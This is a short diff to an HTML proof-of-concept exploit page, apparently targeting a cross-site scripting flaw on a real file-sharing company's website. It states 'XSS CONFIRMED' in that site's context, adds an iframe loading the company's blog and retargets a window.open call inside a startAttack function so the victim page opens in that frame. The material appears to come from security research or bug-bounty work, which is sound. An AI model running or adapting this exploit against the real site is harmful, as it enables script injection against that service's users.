@@ -92,6 +92,8 @@ D. {once: true} load handler is exploitable
 - XSS CONFIRMED in wetransfer page context
 </pre>
 
+<iframe src="https://frontsite-nextjs.wetransfer.net/blog" name="badr"></iframe>
+
 <script>
 function log(msg, cls) {
   const div = document.getElementById('log');
@@ -111,7 +113,7 @@ function startAttack() {
   log('Delay: ' + DELAY + 'ms', 'info');
 
   // Step 1: Open victim page
-  const victim = window.open(TARGET);
+  const victim = window.open(TARGET, "badr");
   if (!victim) {
     log('Popup blocked — allow popups and retry.', 'error');
     return;
